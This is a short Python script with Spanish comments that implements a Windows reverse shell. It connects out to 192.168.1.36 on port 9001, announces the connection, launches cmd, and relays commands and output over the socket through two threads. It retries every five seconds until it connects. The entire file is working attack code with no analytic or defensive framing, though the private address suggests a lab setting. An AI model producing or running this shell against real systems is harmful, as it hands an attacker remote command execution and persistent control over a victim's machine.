import os
import socket
import subprocess
import threading
import time

def s2p(s, p):
    while True:
        data = s.recv(1024)  # Recibe datos del socket
        if len(data) > 0:
            p.stdin.write(data)  # Escribe los datos en la entrada estándar del proceso
            p.stdin.flush()  # Limpia el buffer de entrada

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))  # Lee un byte de la salida estándar del proceso y lo envía al socket


def connect_with_retry():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crea un nuevo socket
        try:
            s.connect(("192.168.1.36", 9001))  # Intenta conectar con la dirección IP y el puerto especificados
             # Envía un mensaje de conexión establecida
            message = "Conexion establecida"
            s.sendall(message.encode())
            

            # Inicia los hilos para la comunicación bidireccional entre el socket y el proceso
            p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

            s2p_thread = threading.Thread(target=s2p, args=[s, p])  # Hilo para enviar datos del socket al proceso
            s2p_thread.daemon = True
            s2p_thread.start()

            p2s_thread = threading.Thread(target=p2s, args=[s, p])  # Hilo para enviar datos del proceso al socket
            p2s_thread.daemon = True
            p2s_thread.start()
           

            try:
                p.wait()  # Espera a que el proceso termine (bloqueante)
            except KeyboardInterrupt:
                s.close()  # Cierra la conexión del socket si se interrumpe el programa con Ctrl+C
                break
        except ConnectionRefusedError:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)  # Espera 5 segundos antes de intentar una nueva conexión
        except ConnectionResetError:
            print("Connexion finalizada por el host.")
            p.kill()  # Termina el proceso
            break

connect_with_retry()  # Llama a la función principal para iniciar el programa